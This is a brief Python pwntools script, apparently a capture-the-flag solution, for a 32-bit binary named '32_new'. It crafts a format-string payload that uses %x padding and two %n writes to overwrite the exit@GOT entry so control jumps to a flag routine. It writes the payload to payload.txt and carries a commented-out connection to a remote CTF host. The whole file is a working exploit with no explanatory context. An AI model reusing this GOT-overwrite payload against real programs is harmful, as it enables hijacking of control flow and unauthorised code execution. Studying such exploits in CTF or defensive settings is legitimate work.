from pwn import *
import time

fp		= './32_new'
elf		= ELF(fp)
fd		= open("payload.txt", "w")

flag_addr	= 0x0804870b #0x8679
ovrwrite_2L	= 103171
exit_got	= elf.got['exit']
print "exit@got: "+hex(exit_got)
junk		= '%x'*8 + '%34438x'
mod_n		= '%n' + '%33017x' + '%n'
payload		= p32(exit_got)
payload		+= '\x41'*4
payload		+= p32(exit_got+0x2)
payload		+= junk
payload		+= mod_n + '\n'

#r	= remote("hack.bckdr.in", 9035)

if(fd):
	fd.write(payload)
	fd.close()

print "Payload saved to payload.txt"
